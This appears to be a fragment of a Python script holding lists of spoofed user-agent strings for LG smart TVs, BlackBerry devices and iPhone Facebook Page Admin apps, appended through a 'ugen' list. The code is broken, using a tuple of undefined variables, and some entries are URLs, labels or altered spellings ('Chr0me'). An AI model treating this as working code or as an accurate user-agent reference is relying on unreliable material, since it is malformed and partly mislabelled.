"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 55UJ750V-ZB; 06.10.30; 1; DTV_W17H); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 55UJ750V-ZB, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 43UK6400PLF; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 43UK6400PLF, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/68.0.3440.106 Safari/537.36 LG Browser/8.00.00(LGE; 49NANO866NA; 04.50.52; 0x00000001; DTV_W20H); webOS.TV-2020; LG NetCast.TV-2013 Compatible (LGE, 49NANO866NA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 55UF8507-ZB; 04.06.25; 1; DTV_W15U); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE, 55UF8507-ZB, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 42LA660V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 42LA660V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 79UB980V-ZA; 05.06.10; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 79UB980V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/68.0.3440.106 Safari/537.36 LG Browser/8.00.00(LGE; 55UN74006LB; 04.50.51; 0x00000001; DTV_W20P); webOS.TV-2020; LG NetCast.TV-2013 Compatible (LGE, 55UN74006LB, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 43UJ634V-ZD; 06.10.50; 1; DTV_W17P); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 43UJ634V-ZD, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/68.0.3440.106 Safari/537.36 LG Browser/8.00.00(LGE; 49NANO866NA; 04.50.51; 0x00000001; DTV_W20H); webOS.TV-2020; LG NetCast.TV-2013 Compatible (LGE, 49NANO866NA, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 47LA669V-ZE; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 47LA669V-ZE, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; OLED55B6V-Z; 05.70.40; 1; DTV_W16K); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, OLED55B6V-Z, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 49UF850V-ZB; 04.06.25; 1; DTV_W15U); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE, 49UF850V-ZB, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 47LA645V-ZC; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 47LA645V-ZC, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 49SM8600PLA; 05.30.40; 1; DTV_W19H); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 49SM8600PLA, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 32LN655V-ZD; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 32LN655V-ZD, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; OLED55C6V-Z; 05.70.30; 1; DTV_W16M); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, OLED55C6V-Z, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 55UM7450PLA; 05.30.40; 1; DTV_W19P); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 55UM7450PLA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 49UK6200PLA; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 49UK6200PLA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 43UM7100PLB; 05.30.40; 1; DTV_W19P); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 43UM7100PLB, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 32LB652V-ZA; 05.05.90; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 32LB652V-ZA, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 42LB580V-ZB; 04.04.27; 0x00000001;); LG NetCast.TV-2013 /04.04.27 (LG, 42LB580V-ZB, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML%2C like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 24LF4820-BU; 03.20.14; 1; DTV_W15L); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE%2C 24LF4820-BU%2C wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 42LA620V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 42LA620V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; OLED65B8PLA; 05.50.15; 1; DTV_W18H); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, OLED65B8PLA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 49UJ631V-ZA; 06.10.50; 1; DTV_W17P); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 49UJ631V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 47LB680V-ZD; 05.05.90; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 47LB680V-ZD, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 49LF630V-ZA; 04.06.75; 1; DTV_W15M); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE, 49LF630V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 49UH610V-ZB; 05.70.35; 1; DTV_W16P); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, 49UH610V-ZB, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 28TN525S-PZ; 05.30.40; 1; DTV_W19R); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 28TN525S-PZ, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 49UH770V-ZA; 05.70.40; 1; DTV_W16K); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, 49UH770V-ZA, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 42LA644V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 42LA644V-ZA, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 49UB820V-ZH; 04.12.36; 0x00000001;); LG NetCast.TV-2013 /04.12.36 (LG, 49UB820V-ZH, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 47LA644V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 47LA644V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 40LF630V-ZA; 04.06.75; 1; DTV_W15M); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE, 40LF630V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 55UH605V-ZC; 05.70.35; 1; DTV_W16P); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, 55UH605V-ZC, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 32LA660V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 32LA660V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; OLED55E7N-Z; 06.10.30; 1; DTV_W17H); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, OLED55E7N-Z, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 42LB650V-ZE; 04.41.42; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 42LB650V-ZE, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 42LB580V-ZM; 04.04.27; 0x00000001;); LG NetCast.TV-2013 /04.04.27 (LG, 42LB580V-ZM, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 43UK6200PLA; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 43UK6200PLA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 55UK6300PLB; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 55UK6300PLB, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/87.0.4280.88 Safari/537.36 LG Browser/8.00.00(LGE; OLED55C24LA; 03.33.16; 0x00000001; DTV_W22O); webOS.TV-2022; LG NetCast.TV-2013 Compatible (LGE, OLED55C24LA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/87.0.4280.88 Safari/537.36 LG Browser/8.00.00(LGE; 55QNED80UQA; 03.30.74; 0x00000001; DTV_W22H); webOS.TV-2022; LG NetCast.TV-2013 Compatible (LGE, 55QNED80UQA, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 42LN570V-ZE; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 42LN570V-ZE, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 55UK6400PLF; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 55UK6400PLF, wired)"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#_______________##____________#
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9930; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.267 Mobile Safari/534.11+ [ip:134.209.137.157]"
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1"
"Mozilla/5.0 (BB10; Touch) AppleWebKit/537.10+ (KHTML, like Gecko) Version/16.4 Mobile Safari/537.10+"
"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105(Linux LLC"
"User-Agent:Opera/9.80 (BlackBerry; Opera Mini/7.1.33551/37.6652; U; en) Presto/2.12.423"
"User-Agent:Opera/9.80 (BlackBerry; Opera Mini/7.1.33551/37.6652; U; en) Presto/2.12.423 Version/68.0.3618.104"
"Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML like Gecko) Version/16.4 Safari/536.2+"
"BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331 UNTRUSTED/1.0 3gpp-gba/UC Browser8.0.3.107/70/352 UNTRUSTED/1.0"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9780; nl) AppleWebKit/534.1 (KHTML, like Gecko) Version/6.0.0.294 Mobile Safari/534.1"
"Mozilla/5.0 (PlayBook; U; RIM Tablet OS 1.0.0; en-US) AppleWebKit/536.2+ (KHTML, like Gecko) Version/7.2.1.0 Safari/536.2+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; nl) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.668 Mobile Safari/534.8+"
"Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.1.2708 Mobile Safari/537.35+"
"Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML%2C like Gecko) Version/10.3.1.2576 Mobile Safari/537.35+"
"Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML%2C like Gecko) Version/10.3.2.2876 Mobile Safari/537.35+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9360; en-GB) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.353 Mobile Safari/534.11+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en)Chrome/60.0 Mobile Safari/540.35"
"Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML%2C like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+"
"NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+ UNTRUSTED/1.0"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9650; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.719 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; fr) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.534 Mobile Safari/534.8+"
"BlackBerry9500/4.2.0.380 Profile/MIDP-2.0 Configuration/CLDC-1.1/Mozilla/5.0/5.0"
"NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331 UNTRUSTED/1.0"
"BlackBerry7290/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100"
"BlackBerry7100/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; es) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.668 Mobile Safari/534.8+"
"BlackBerry9700/5.0.0.423 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/10"
"Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML%2C like Gecko) Version/10.3.2.2876 Mobile Safari/537.35+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9780; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.668 Mobile Safari/534.8+"
"BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/155"
"https://developers.whatismybrowser.com/useragents/parse/1235567opera-mini-blackberry-os-blackberry-presto"
"BlackBerry7520/4.0.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/ CLDC-1.1 VendorID/100"
"BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/167"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9360; it) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.336 Mobile Safari/534.11+"
"BlackBerry8100/2.7.0.60 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"BlackBerry7250/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104"
"BlackBerry7250/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/114"
"BlackBerry7290/4.1.0Profile/MIDP-2.0 Configuration/CLDC-1.1"
"BlackBerry9300/5.0.0.888 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331"
"BlackBerry9300/5.0.0.955 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/102"
"BlackBerry8900/5.0.0.681 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/302"
"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/131"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.570 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; it) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.666 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.570 Mobile Safari/534.8+"
"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/603"
"BlackBerry8320/4.5.0.52 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/603"
"BlackBerry9700/5.0.0.344 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/229"
"BlackBerry8900/5.0.0.681 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/179"
"BlackBerry9330/5.0.0.857 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/105"
"BlackBerry7130/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/125"
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/107"
"BlackBerry9700/5.0.0.442 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/603"
"BlackBerry9630/5.0.0.624 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/104"
"BlackBerry9650/5.0.0.1006 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/105"
"BlackBerry8320/4.5.0.188 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100"
"BlackBerry9520/5.0.0.713 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/1"
"BlackBerry7520/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML%2C like Gecko) Version/10.3.3.3216 Mobile Safari/537.35+"
"Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML%2C like Gecko) Version/10.3.3.3216 Mobile Safari/537.35+"
"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"BlackBerry8520/4.6.1.314 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102"
"BlackBerry7290/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104"
"BlackBerry9700/5.0.0.344 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/129"
"BlackBerry/BBF100-1 (Linux;Android 8.1.0)"
"https://user-agents.net/string/blackberry7100-4-0-0-profile-midp-2-0-configuration-cldc-1-1"
"Android 4.0 Blackberry - Mozilla Firefox 8.0"
"Mozilla/5.0 (BlackBerry; U) AppleWebKit/534.11+ (KHTML, like Gecko) Version/10.3.3.3126 Mobile Safari/537.6+"
"Mozilla/5.0 (BlackBerry; U) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.1047 Mobile Safari/534.11+"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#_______________##____________#
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H19 [FBAN/FBPageAdmin;FBAV/389.1.0.35.108;FBBV/591897174;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.7;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/35981389-929C-4180-BCC3-31A7B6EEE4B7;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21D61 [FBAN/FBPageAdmin;FBAV/385.0.0.46.109;FBBV/581382015;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/17.3.1;FBSS/3;FBID/phone;FBLC/nl_NL;FBOP/5;FBDI/0905B70E-1DBA-43F5-8081-DFA57B3F1250;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBPageAdmin;FBAV/379.1.0.43.109;FBBV/566867511;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/C891ABC9-FE8E-41C2-ADBE-7EB767E9724E;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H19 [FBAN/FBPageAdmin;FBAV/372.0.0.32.117;FBBV/545962857;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.7;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/35981389-929C-4180-BCC3-31A7B6EEE4B7;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H19 [FBAN/FBPageAdmin;FBAV/371.0.0.38.231;FBBV/543880287;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.7;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/35981389-929C-4180-BCC3-31A7B6EEE4B7;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 [FBAN/FBPageAdmin;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/32B9C367-DEB5-413F-9868-27AC6B57283B]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBPageAdmin;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/99E3B2F9-F320-412A-B773-148373639CDB]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBPageAdmin;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/35981389-929C-4180-BCC3-31A7B6EEE4B7]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBPageAdmin;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBDI/65432538-7E06-4E15-A43E-C212E4D9C4B9]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBPageAdmin;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/da_DK;FBOP/5;FBDI/BE9904C1-02F3-4FF4-A216-0D0186BE28CA]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBPageAdmin;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/F04DEA5A-BCEA-437B-88CB-F9E2DA0938A8]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBPageAdmin;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/2D50F24E-38B5-409D-886F-BF80819514B6]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/938E109E-0BBB-4A4A-BF43-D9CEE429ACFA]"
